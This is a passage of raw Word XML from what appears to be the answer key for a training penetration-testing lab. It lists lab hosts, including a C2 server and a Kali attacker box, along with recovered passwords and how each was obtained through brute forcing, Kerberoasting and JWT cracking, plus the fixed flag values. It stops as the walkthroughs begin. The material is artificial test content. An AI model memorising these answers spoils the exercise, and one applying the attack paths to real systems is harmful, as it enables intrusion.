              <w:t>172.28.10.50 / .20.80</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ+Int</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Sliver C2 server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-snmp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SNMP device, leaks sysDescr + sysContact</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-pivot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-01 foothold (SSH attack, privesc, C2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.60</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Crown-jewel SMB file server (exfil)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-victim</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.61</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-02, cleartext FTP for ARP MITM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-workstation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.70</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-03, writable SMB drop share, SUID/sudo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-ldap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.90</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LDAP directory, anonymous bind</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-jump</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.100 / .30.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Int+Restr</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Jump host into the restricted segment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-syslog</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.110</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Central log collector, leaks a credential</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-vault</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.30.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Restricted</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Crown jewel, only via the jump host</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-kali</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.10 / .20.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ+Int</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Kali attacker (browser terminal :7681)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Credentials (all recovered during the engagement)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Account</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Where</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>How it is obtained</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>jsmith</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Password1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-01 SSH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Recovered by hydra in Password Attack (SSH); reused in C2, persistence, and privesc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>svcapp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Falcon2023!</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-01 SSH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Looted from app_config.php in Post-Exploitation Pillaging; reused in Credential Reuse and Lateral Movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pmorgan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Autumn2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-01 SSH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Found by Password Spraying</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>root</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Summer2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Cracked from /var/backups/shadow.bak in Local Password Attack and Privilege Escalation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>victim</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>(no password)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ws-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Payload/implant session; SUID and sudo privesc (Privilege Escalation modules)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>(none)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>vnc-01 VNC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Brute forced by hydra in Remote Desktop (VNC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>postgres</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>(trust, none)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>db-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>No auth in Database Exploitation (PostgreSQL)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>root</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>(empty)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>db-01 MySQL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>No password in Database Exploitation (MySQL)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>svc_backup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ServiceB@ckup2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LDAP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Leaked in the svc_backup description in Directory Enumeration (LDAP)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>(JWT secret)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Summer2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>sso-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Cracked HS256 secret in SSO Token Forgery (JWT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>reporting</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Rep0rting#2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>log / db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Cleartext in an exported log in Log Mining</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>svc_sql</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Winter2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Kerberos</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Cracked from a TGS-REP ticket in Kerberoasting (offline)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>opsadmin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>OpsTransit#2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>jump-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Leaked in the wiki runbook in Credentials in the Wiki; opens the jump host in Deep Pivot to the Restricted Segment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>svc_vault</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>V@ultKeeper2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>vault-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>From jump-host handover notes in Deep Pivot to the Restricted Segment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Static flags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Flag variable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MODULE_13_WIFI_FLAG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Baseball1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Wi-Fi passphrase baked into the shipped handshake</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MODULE_ENT_KRB_FLAG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Winter2024</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>svc_sql password baked into the shipped TGS-REP ticket</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MODULE_ENT_LDAP_FLAG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PENTESTTV{ldap_anon_bind_leaks_service_creds}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>In the LDAP svc_backup description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MODULE_ENT_GIT_FLAG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PENTESTTV{secrets_live_forever_in_git_history}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>API_KEY in git history</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MODULE_ENT_WIKI_FLAG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PENTESTTV{wiki_pages_leak_operational_creds}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Token on the wiki runbook page</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>These five flags are the same on every deploy. All other flags are random PENTESTTV{32-hex} values, regenerated each deploy and recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Module walkthroughs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Modules are grouped by phase in scoreboard order (DMZ, then Internal, then Restricted). Each lists the exact Kali commands, the expected result, and where the flag lives. Addresses assume the shipped topology.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="8A6D1A"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Phase 1: DMZ · External Foothold</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>6</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MODULE_04_DNS_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
